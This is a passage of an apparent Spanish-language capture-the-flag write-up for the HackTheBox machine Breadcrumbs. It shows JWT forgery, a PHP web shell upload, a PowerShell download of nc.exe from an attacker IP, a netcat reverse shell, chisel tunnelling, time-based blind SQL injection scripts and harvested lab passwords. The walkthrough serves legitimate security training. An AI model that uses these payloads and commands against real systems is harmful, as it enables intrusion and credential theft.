Ya podemos navegar tranquilamente sobre el recurso `/files.php`, pero hay un problema aún, ya que el otro `cookie` (`token`) tiene contenido de `lanz` y no de `paul` asi que no podemos subir nada aún:

![316burp_err_up_zipF_x_tokenErr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_err_up_zipF_x_tokenErr.png)

Si borramos la cookie `token` obtenemos este error:

![316page80_err_up_zipF_x_tokenErr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_err_up_zipF_x_tokenErr.png)

```php
book=../portal/includes/fileController.php&method=1
```

```php
<?php

$ret = "";
require "../vendor/autoload.php";
use \Firebase\JWT\JWT;
session_start();
function validate(){    
    $ret = false;  
    $jwt = $_COOKIE['token'];    
    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'; 
    $ret = JWT::decode($jwt, $secret_key, array('HS256')); 
    return $ret;
}
if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username; 
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '../uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];
        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
            $ret = "Success. Have a great weekend!";
        }
        else{
        $ret = "Missing file or title :(" ;      
        }
    }
    else{
    $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }
    echo $ret;
}
```

Vemos el proceso por el que pasa el archivo que subamos (no hay validación de nada :O) y la carpeta en la que queda guardado: `/uploads`.

* [Siguiendo este post, podemos ver que hay detrás de la cadena **token**](https://habr.com/en/post/450054/).

Usando [esta web](https://jwt.io/) también vemos como esta conformado el `token` y asi mismo podemos modificarla para generar la de `paul`:

* [Guia para generar nuevos tokens apoyado en el **secret key** (que encontramos antes)](https://knowledgecenter.2checkout.com/Documentation/07Commerce/2Checkout-ConvertPlus/How-to-generate-a-JSON-Web-Token-JWT).

![316google_genToken_decodelanzTK](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316google_genToken_decodelanzTK.png)

Siguiendo la guía, ahora simplemente modificaríamos el username por `paul` y pondríamos en ese cuadro la `secret key`, generaríamos e intentaríamos de nuevo subir el archivo `.zip`

![316google_genToken_paulTK](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316google_genToken_paulTK.png)

Validamos:

![316burp_done_up_zipF_paul](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_done_up_zipF_paul.png)

Perfecto, ahora sí, modifiquemos con el editor de cookies la variable `token` y validemos desde la web:

![316page80_done_up_zipF_paul](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_done_up_zipF_paul.png)

Si jugamos con `burp` para modificar el nombre con el que viaja logramos subir un archivo `.php` con contenido `PHP`:

Original sin modificar:

![316burp_err_up_phpF](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_err_up_phpF.png)

Spoiler: **Ignoren el `PHP`, no puedo borrarlo :P**

![316page80_err_up_phpF](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_done_up_zipF_paul.png)

Se subió como `holi.zip`, simplemente en `Burp` le cambiamos la extensión: 

```html
...
<?php

echo "Hola";

?>

-----------------------------1138605338005785511225757143
Content-Disposition: form-data; name="task"

holi.php
...
```

![316page80_done_up_phpF](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_done_up_phpF.png)

![316page80_phpF_holi](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_phpF_holi.png)

Perfecto, ya con esto podemos conseguir ejecucion de comandos en el sistema, hagámoslo para lanzarnos una Reverse Shell...

```php
...
Content-Type: application/x-php

<?php
    $coma=shell_exec($_GET['xmd']); echo $coma;
?>


-----------------------------1138605338005785511225757143
...
```

![316page80_phpF_holi_RCE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_phpF_holi_RCE.png)

Enumerando podemos escribir en el directorio:

```powershell
C:\Users\www-data\Desktop\\xampp\tmp
```

Aprovechemos esto para subir el binario `nc` para posteriormente lanzarnos una petición hacia nuestro listener y obtener una Shell:

Nos ponemos en escucha donde tengamos el binario y ejecutamos:

```html
?xmd=powershell -c "IWR -uri http://10.10.14.194:8000/nc64.exe -OutFile C:\\Users\\www-data\\Desktop\\xampp\\tmp\\nc.exe"
```

Validamos:

```html
?xmd=dir C:\Users\www-data\Desktop\\xampp\tmp\
```

```powershell
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\www-data\Desktop\\xampp\tmp

03/12/2021  12:55 PM    <DIR>          .
03/12/2021  12:55 PM    <DIR>          ..
03/12/2021  12:47 PM                12 holas.txt
03/12/2021  12:55 PM            45,272 nc.exe
03/12/2021  12:53 PM                 0 sess_04f3tvcgqt3lcuabhihd56tbdv
...
```

Perfecto, ahora nos ponemos es escucha con `nc` y ejecutamos:

```html
?xmd=C:\Users\www-data\Desktop\\xampp\tmp\nc.exe 10.10.14.194 4433 -e cmd.exe
```

Yyyy:

![316bash_revSH_wwwdata](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_revSH_wwwdata.png)

Tamos dentroooooooooooooooeoeoeowowoewoeowirjaksdfj (: Ahora a enumerar...

> [Script que nos permite ejecutar comandos automatizando todo lo anterior](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/RCE_uploadPHPfile.py).

...

## Movimiento lateral www-data -> juliette [#](#movimiento-lateral-juliette) {#movimiento-lateral-juliette}

Dándole un vistazo a los archivos que hay en la ruta `/portal` encontramos una carpeta llamativa sobre pizza :P

```powershell
PS C:\Users\www-data\Desktop\\xampp\htdocs\portal> dir
...
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/8/2021   5:37 AM                assets
d-----          2/8/2021   5:37 AM                db
d-----          2/8/2021   5:37 AM                includes
d-----          2/8/2021   5:37 AM                php
d-----          2/8/2021   5:37 AM                pizzaDeliveryUserData
d-----         3/12/2021   4:46 PM                uploads
d-----          2/8/2021   5:37 AM                vendor
-a----          2/1/2021  10:40 PM           3956 authController.php
-a----          2/1/2021   9:40 PM            114 composer.json
-a----        11/28/2020  12:55 AM           6140 composer.lock
-a----         12/9/2020   3:30 PM            534 cookie.php
-a----          2/1/2021   6:59 AM           3757 index.php
-a----          2/1/2021   1:57 AM           2707 login.php
-a----         1/16/2021   1:47 PM            694 logout.php
-a----          2/1/2021   1:58 AM           2934 signup.php
```

Pues si entramos:

```powershell
PS C:\Users\www-data\Desktop\\xampp\htdocs\portal\pizzaDeliveryUserData> dir
...
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/28/2020   1:48 AM            170 alex.disabled
-a----        11/28/2020   1:48 AM            170 emma.disabled
-a----        11/28/2020   1:48 AM            170 jack.disabled
-a----        11/28/2020   1:48 AM            170 john.disabled
-a----         1/17/2021   3:11 PM            192 juliette.json
-a----        11/28/2020   1:48 AM            170 lucas.disabled
-a----        11/28/2020   1:48 AM            170 olivia.disabled
-a----        11/28/2020   1:48 AM            170 paul.disabled
-a----        11/28/2020   1:48 AM            170 sirine.disabled
-a----        11/28/2020   1:48 AM            170 william.disabled
```

Y claramente vemos algo diferente (además de ser algo de `juliette`, que desde el inicio nos llamó la atención), `juliette.json`:

```powershell
PS C:\Users\www-data\Desktop\\xampp\htdocs\portal\pizzaDeliveryUserData> type juliette.json
```

```json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

Tenemos nuevas credenciales, al parecer de un servicio de pizza, en el que `juliette` le da igual poner sus credenciales porque simplemente son del portal de pizza, no? Salgamos de la duda...

Usando `SSH` hacia la máquina:

![316bash_SSH_juliette_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_SSH_juliette_done.png)

Perfecto, haciendo reutilización de credenciales logramos obtener una sesión como `juliette` dentro del sistema (: con ella tenemos la flag del usuario...

...

## Movimiento lateral juliette > development [#](#movimiento-lateral-dev) {#movimiento-lateral-dev}

Tenemos un archivo con tareas que `juliette` tiene planteado hacer:

```powershell
PS C:\Users\juliette\Desktop> type .\todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

Si nos fijamos en la segunda tarea, habla sobre el software [Microsoft Store Sticky Notes](https://en.wikipedia.org/wiki/Sticky_Notes) (app para tomar notas en el escritorio), que al parecer guarda las contraseñas en texto plano...

Con esto en la cabeza y buscando en internet cuál es el directorio donde se guardan, encontramos este recurso:

* [How to back up and restore **Sticky Notes** in **Windows 10**](https://www.techrepublic.com/article/how-to-backup-and-restore-sticky-notes-in-windows-10/).
* Acá también lo reseñan, [How to Back Up and Restore Sticky Notes in Windows](https://www.howtogeek.com/283472/how-to-back-up-and-restore-sticky-notes-in-windows/).

Donde nos habla que en la ruta:

```powershell
C:\Users\Username\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState  
```

Se encuentran archivos relacionados con `Sticky Notes` y si, validando encontramos la ruta:

```powershell
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> ls -force

    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal
```

Si leemos el archivo `plum.sqlite-wal` vemos algún tipo de traza:

![316bash_SSH_juliette_sticky_found_PWs](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_SSH_juliette_sticky_found_PWs.png)

Claramente vemos la contraseña de `juliette` y lo que parece ser otra contraseña de un usuario llamado `development`, si hacemos una validación rápida de los usuarios tenemos:

```powershell
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> dir c:\Users

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/26/2021   9:06 AM                Administrator
d-----         1/26/2021   9:11 AM                development
d-----          2/1/2021   5:48 AM                juliette
d-r---         1/15/2021   3:43 PM                Public
d-----          2/8/2021  10:13 PM                www-data
```

Bien, existe...

También vemos la traza del usuario `administrator`, pero de él no vemos nada relevante... Probemos con esa cadena contra el usuario `development` sobre el servicio `SSH`:

![316bash_SSH_development_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_SSH_development_done.png)

Opa, efectivamente, tenemos una sesión como `development`, a ver que encontramos en él...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En la raíz del sistema encontramos una carpeta relacionada con nuestro usuario:

```powershell
PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/15/2021   4:03 PM                Anouncements
d-----         1/15/2021   4:03 PM                Development
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---          2/1/2021   7:50 AM                Program Files
d-r---         12/7/2019   1:54 AM                Program Files (x86)
d-r---         1/17/2021   1:41 AM                Users
d-----          2/1/2021   1:10 AM                Windows

PS C:\>
```

Dentro tenemos:

```powershell
PS C:\> cd .\Development\
PS C:\Development> dir


    Directory: C:\Development


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/29/2020   3:11 AM          18312 Krypter_Linux

```

Algo curioso es que el `owner` del archivo es `juliette`, pero con su sesión no podemos entrar en esa carpeta, jmm.

```powershell
PS C:\Development> Get-Acl .\Krypter_Linux

    Directory: C:\Development

Path          Owner                Access
----          -----                ------
Krypter_Linux BREADCRUMBS\juliette NT AUTHORITY\SYSTEM Allow  ReadAndExecute, Synchronize...

```

* [Determine the owner of a file **PowerShell**](https://devblogs.microsoft.com/scripting/hey-scripting-guy-how-can-i-use-windows-powershell-to-determine-the-owner-of-a-file/).

> Tambien podemos ver el owner en la cmd usando `dir /q`.

Inspeccionemos el archivo... (No nos deja ejecutarlo)

```powershell
PS C:\Development> type .\Krypter_Linux
⌂ELF☻☺☺♥>☺...
...
New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***
Requesting decryption key from cloud...
Account: Administratorhttp://passmanager.htb:1234/index.phpmethod=select&username=administrator&table=passwordsServer response:

Incorrect master keyNo key supplied.
USAGE:
...
```

Vale vale valeeee, encontramos cosas interesantes:

* Es un binario `ELF`.
* Creado efectivamente por `juliette`.
* Hace peticiones para desencriptar llaves desde la nube.
* `Account`: `Administrator` (raro)
* Servicio sirviendo en el puerto `1234` del dominio `passmanager.htb`.

```html
http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords
```

Podemos pensar en un **Port Forwarding**, validemos si el puerto esta escuchando localmente:

```powershell
PS C:\Development> netstat -a

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:22             Breadcrumbs:0          LISTENING
  TCP    0.0.0.0:80             Breadcrumbs:0          LISTENING
...
  TCP    127.0.0.1:1234         Breadcrumbs:0          LISTENING
...
```

Si lo esta...

Intentemos pasarnos el binario a nuestra máquina, a ver si logramos ejecutarlo.

Nos compartimos una carpeta con `SMB`, la llamaré `smbFolder`:

```bash
❭ python3 smbserver.py smbFolder $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Y ahora en la máquina Windows, le indicamos que nos copie ese binario a través de una carpeta compartida en la red:

```powershell
PS C:\Development> copy .\Krypter_Linux \\10.10.14.194\smbFolder\Krypter_Linux
```

Recibimos info en nuestro servidor de la conexión entrante y ya tendríamos el binario:

```bash
❭ file Krypter_Linux 
Krypter_Linux: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
```

```bash
❭ ./Krypter_Linux 
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
***

No key supplied.
USAGE:

Krypter <key>
```

...

Podemos apoyarnos de `cURL` e intentar visitar el recurso al cual se esta llamando en el binario:

```powershell
PS C:\Development> curl "http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords"
curl : The remote name could not be resolved: 'passmanager.htb'
...
```

Exacto. Pero como ya vimos, esta localmente activo, asi que cambiémosla por `localhost`:

```powershell
PS C:\Development> curl "http://localhost:1234/index.php?method=select&username=administrator&table=passwords"      
curl : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the 
UseBasicParsing parameter and try again.
...
```

Nos indica que debemos agregarle el parámetro `UseBasicParsing` por unos temas de configuración con `Internet Explorer`:

```powershell
PS C:\Development> curl "http://localhost:1234/index.php?method=select&username=administrator&table=passwords" -UseBasicParsing

StatusCode        : 200
StatusDescription : OK
Content           : selectarray(1) {
                      [0]=>
                      array(1) {
                        ["aes_key"]=>
                        string(16) "k19D193j.<19391("
                      }
                    }

RawContent        : HTTP/1.1 200 OK
                    Content-Length: 96
                    Content-Type: text/html; charset=UTF-8
                    Date: Sat, 13 Mar 2021 04:01:30 GMT
                    Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
                    X-Powered-By: PHP/8.0.1

                    sel...
Forms             :
Headers           : {[Content-Length, 96], [Content-Type, text/html; charset=UTF-8], [Date, Sat, 13 Mar 2021 04:01:30 GMT], [Server, Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        :
RawContentLength  : 96

```

Ahora sí, tenemos una `aes_key`, una cabecera y nada más...

Si provocamos un error obtenemos:

```powershell
PS C:\Development> curl "http://localhost:1234/index.php?method=select&username=administrator&table='" -UseBasicParsing        

StatusCode        : 200
StatusDescription : OK
Content           : select<br />
                    <b>Fatal error</b>:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in
                    C:\Users\Administrator\Desktop\passwordManager\htdocs\index...
RawContent        : HTTP/1.1 200 OK
...
```

Probablemente debamos hacer `SQLi` o incluso `fuzzing` para encontrar otras tablas, pero intentando por consola no logre nada, además podemos pensar que el output es más grande y ejecutándolo por consola no nos lo muestra completo, quizás por medio de la web obtengamos algo diferente, hagamos el `Remote Port Forwarding`, usaré [chisel](https://github.com/jpillora/chisel):

* [Uno de los recursos en que me guie](https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/).
* [S4vitar también tiene un video explicándolo](https://www.youtube.com/watch?v=0rmG5EneRuQ&t=4440s).

**Atacante (server):**

En [su repo](https://github.com/jpillora/chisel/releases) descargar en binario para:

* **Windows**: `chisel_1.7.6_windows_amd64.gz`. 
* **Linux**: `chisel_1.7.6_linux_amd64.gz`. 

> (Esto para tener la misma version en los dos binarios y que no nos genere problemas de compatibilidad)

```bash
#Para montarnos el server más adelante
❭ gunzip chisel_1.7.6_linux_amd64.gz
❭ mv chisel_1.7.6_linux_amd64 chisel
❭ chmod +x chisel

#El binario a subir en la máquina Windows (descargado del repo)
❭ gunzip chisel_1.7.6_windows_amd64.gz
❭ upx chisel_1.7.8_windows_amd64 #Hacemos el binario un toque más liviano
❭ mv chisel_1.7.6_windows_amd64 chisel.exe
❭ python3 smbserver.py smbFolder $(pwd) -smb2support
...
```

**Victima (cliente):**

```powershell
PS C:\Users\development\Videos> copy \\10.10.14.194\smbFolder\chisel.exe C:\Users\development\Videos\chisel.exe
PS C:\Users\development\Videos> .\chisel.exe

  Usage: chisel [command] [--help]

  Version: 1.7.6 (go1.16rc1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel

```

**Atacante (server):**

```bash
#Nos ponemos en escucha por el puerto 1111
❭ ./chisel server -p 1111 --reverse
2021/03/13 25:25:25 server: Reverse tunnelling enabled
2021/03/13 25:25:25 server: Fingerprint 1kWWQwYT0YxKjY9xsxSSL76G0IJLlLThmvRQ+t/ZdoE=
2021/03/13 25:25:25 server: Listening on http://0.0.0.0:1111
```

**Victima (cliente):**

```powershell
PS C:\Users\development\Videos> .\chisel.exe client 10.10.14.194:1111 R:1234:localhost:1234
2021/03/12 25:25:25 client: Connecting to ws://10.10.14.194:1111
2021/03/12 25:25:25 client: Connected (Latency 117.0553ms)
...
```

* Le indicamos el puerto e IP en el que estamos escuchando: `10.10.14.194:1111`.
* Cuando obtengamos la conexión, el puerto `1111` pasara a ser el puerto `1234` que se esta sirviendo localmente `localhost:1234`.

**Atacante (server):**

```bash
...
2021/03/13 25:25:25 server: session#1: tun: proxy#R:1234=>localhost:1234: Listening
```

Listo, validemos:

```bash
❭ curl "http://localhost:1234/index.php?method=select&username=administrator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

En la web:

![316page1234_remPortFort_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page1234_remPortFort_done.png)

...

Despues de algo de pruebas sobre la URL, logramos obtener nuestro `SQLi` (es uno basado en tiempo), el parámetro vulnerable es `username`, con este simple payload logramos darle a la página un tiempo de respuesta de `5` segundos, si refrescamos y la página se demora ese tiempo, quiere decir que tenemos inyección (:

```html
http://127.0.0.1:1234/index.php?method=select&username=administrator' AND sleep(5) AND '1'='1&table=passwords
o
http://127.0.0.1:1234/index.php?method=select&username=a' OR sleep(5) AND '1'='1&table=passwords
```

Listo, podemos crearnos un script para automatizar la extracción de la data.

**(Si recordamos cuando encontramos el archivo `db.php` habla de la base de datos llamada `bread`, podríamos saltarnos este paso, pero igual se los quiero mostrar para que vean como es el proceso)**

...

### SQL injection - time based (blind) [⌖](#sqli-blind) {#sqli-blind}

---

##### Obtenemos nombre de la <u>base de datos</u>.

👀

```py
#!/usr/bin/python3

import requests, time
from pwn import *

url = "http://localhost:1234/index.php"

p1 = log.progress("SQLi blind")
p2 = log.progress("Database name")

session = requests.Session()

# Creamos nuestro "diccionario"
dic_letters = "abcdefghijklmnopqrstuvwxyz0123456789.+!$#-~}:\"\'{*][%,&/\)(=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
result = ""

# Recorrera 16 posiciones en la palabra, osea para intentar encontrar 16 caracteres
for position in range(1, 16):
    # Toma cada caracter de nuestro "dic"
    for letter in dic_letters:
        # Extrae el tiempo antes de la peticion
        time_now = time.time()

        payload = "?method=select&"
        payload += "username=administrator' and if(substr(database(),%d,1)='%s',sleep(3),1) and '1'='1&" % (position, letter)
        payload += "table=passwords"

        p1.status(payload)
        r = session.get(url + payload)

        # Extrae el tiempo despues de la peticion
        time_after = time.time()

        # Validamos los tiempos, si hay diferencia de 3 o más, sabemos que esa peticion hablo con la base de datos, por lo tanto extraemos la letra 
        if time_after - time_now > 2:
            result += letter
            p2.status(result)
            break

p1.success("Done")
p2.success(result)
```

> [extract_db_name.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_db_name.py)

![316bash_scriptSQLi_dbname](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_dbname.png)

*No sé por qué toma los `+` como caracteres válidos, pero bueno, obtenemos el nombre de la base de datos: `bread`*.

...

##### Obtenemos tablas de la base de datos <ins>bread</ins>.

👀

```py
...
# Para ir iterando entre las tablas, en este caso iterar en 5 tablas (asi evitamos errores)
for table_num in range(0, 5):
    p4 = log.progress("Table name")
    for position in range(1, 16):
        for letter in dic_letters:
            time_now = time.time()

            payload = "?method=select&"
            payload += "username=administrator' and if(substr((SELECT table_name FROM information_schema.tables WHERE table_schema='bread' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&" % (table_num, position, letter)
            payload += "table=passwords"
...
```

> [extract_tables.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_table_names.py)

![316bash_scriptSQLi_tables](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_tables.png)

Interesante, solo hay una tabla llamada `passwords`, extraigamos sus columnas...

...

##### Obtenemos columnas de la tabla <u>passwords</u>.

👀

```py
...
# Iteramos entre las columnas
for column_num in range(0, 5):
    p4 = log.progress("Column name")
    for position in range(1, 16):
        for letter in dic_letters:
            time_now = time.time()

            payload = "?method=select&"
            payload += "username=administrator' and if(substr((SELECT column_name FROM information_schema.columns WHERE table_schema='bread' and table_name='passwords' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&" % (column_num, position, letter)
            payload += "table=passwords"
...
```

> [extract_columns.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_column_names.py)

![316bash_scriptSQLi_columns](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_columns.png)

Perfecto, tenemos 4 columnas, enfoquémonos en las columnas `account` y `password` para asi entender de quien es cada password.

> `aeskey` es realmente `aes_key`, me di cuenta relacionandolo con la respuesta normal antes de hacer el SQLi (y pues que me faltaba ese char en el dic).

...

##### Obtenemos la información de la columna <u>account</u>.

👀

```py
...
for acc_num in range(0, 3):
    p4 = log.progress("Account")
    for position in range(1, 16):
        for letter in dic_letters:
            time_now = time.time()

            payload = "?method=select&"
            payload += "username=administrator' and if(substr((SELECT account FROM passwords LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&" % (acc_num, position, letter)
            payload += "table=passwords"
...
```

> [extract_users.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi/extract_users.py)

![316bash_scriptSQLi_acc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_acc.png)

Nice, solo hay un usuario, `administrator`, ahora veamos el contenido del campo `password` relacionado con el usuario `administrator`.

...

##### Obtenemos la información de la columna <u>password</u>.

👀

```py
...
p2 = log.progress("Password administrator")
# Agregamos mas posiciones, quizas la contraseña es larga
for position in range(1, 70):
    for letter in dic_letters:
        time_now = time.time()

        payload = "?method=select&"
        payload += "username=administrator' and if(substr((SELECT password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&" % (position, letter)
        payload += "table=passwords"
...
```

![316bash_scriptSQLi_pass](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_pass.png)

Opa, (vemos los `+` asi que cortamos desde ahí) obtenemos la contraseña del usuario `administrator`. (Antes de probarla contra `SSH`) creo que no nos va a funcionar, ya que no distinguió entre mayúsculas y minúsculas... Y pues es muy raro que no tengamos ni una mayúscula en una password tan larga.

Intentamos conectarnos por medio de `SSH`:

```bash
❭ ssh administrator@10.10.10.228
administrator@10.10.10.228's password: 
Permission denied, please try again.
```

Efectivamente, no logramos entrar, asi que buscando en internet hay dos maneras para que `mysql` haga uso del `case sensitive`, la más sencilla es usar `BINARY` al lado del objeto que estamos buscando:

* [How to check case sensitive SQL](https://stackoverflow.com/questions/16581560/how-to-check-username-and-password-case-sensitive/16581688).
* [La segunda manera, usando valores ascii](https://medium.com/@nyomanpradipta120/blind-sql-injection-ac36d2c4daab).

> **SPOILER MÁQUINA CACHE**: La manera de los valores ascii la use en la [máquina **Cache**](https://lanzt.github.io/blog/htb/HackTheBox-Cache#explotacion), por si quieren hecharle un ojo.

👀

```py
...
        payload = "?method=select&"
        payload += "username=administrator' and if(substr((SELECT BINARY password FROM passwords WHERE account='administrator'),%d,1)='%s',sleep(3),1) and '1'='1&" % (position, letter)
        payload += "table=passwords"
...
```

![316bash_scriptSQLi_pass_caseSensitive](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_scriptSQLi_pass_caseSensitive.png)

Listo, ahora si (además que no nos muestra los `+`, asi que solucionamos dos problemas en uno), pero intentando con esa contraseña no obtenemos acceso tampoco... 

> Acá fue donde pense en la columna `aes_key` y que me faltaba el char "`_`" en el dic, (aca aún no me habia dado cuenta que me faltaba) asi que lo agregue y volvi a intentar, pero no, obtenemos la misma contraseña.

Asi que debemos hacer algo con:

```html
H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=
```

Si relacionamos la `aes-key` podemos pensar que debemos usarla para desencriptar la password y despues ahí si usarla contra el usuario `administrator` sobre `SSH`...

* [Usando esta web, logramos desencriptar la cadena](https://www.devglan.com/online-tools/aes-encryption-decryption).

![316google_aesdecrypt](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316google_aesdecrypt.png)

Nos responde con una cadena en `base64`, si la tomamos y la decodeamos obtenemos la contraseña real:

```bash
❭ echo "cEBzc3cwcmQhQCMkOTg5MC4v" | base64 -d ; echo
p@ssw0rd!@#$9890./
```

Yyyy si ahora intentamos por `SSH`:

![316bash_ssh_admin_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316bash_ssh_admin_done.png)

SIIIIIIIIIIIIIIIIIIIIIIIII, ufff somos el usuario **administrator** dentro de la máquina. 

Y si, solo nos quedarían ver las flags:

![316flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316flags.png)

...

Les dejo el código vulnerable al `SQLi` por si le quieren echar un ojo:

```powershell
PS C:\Users\Administrator\Desktop\passwordManager\htdocs> type .\index.php
```

```php
<?php

$host="localhost";
$port=3306;
$user="passwordM";
$password="hWjSh812jDn1asd./213-91!#(";
$dbname="bread";
$method = "";
$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
if(isset($_REQUEST['method'])){
        $method = $_REQUEST['method'];
}
echo $method;
if($method == "select"){
        $sql = "SELECT aes_key FROM ".$_REQUEST['table']." WHERE account='".$_REQUEST['username']."'";
        $results = $con->query($sql);

        echo var_dump(mysqli_fetch_all($results,MYSQLI_ASSOC));
}

else{
        echo "Bad Request";
}
```

...

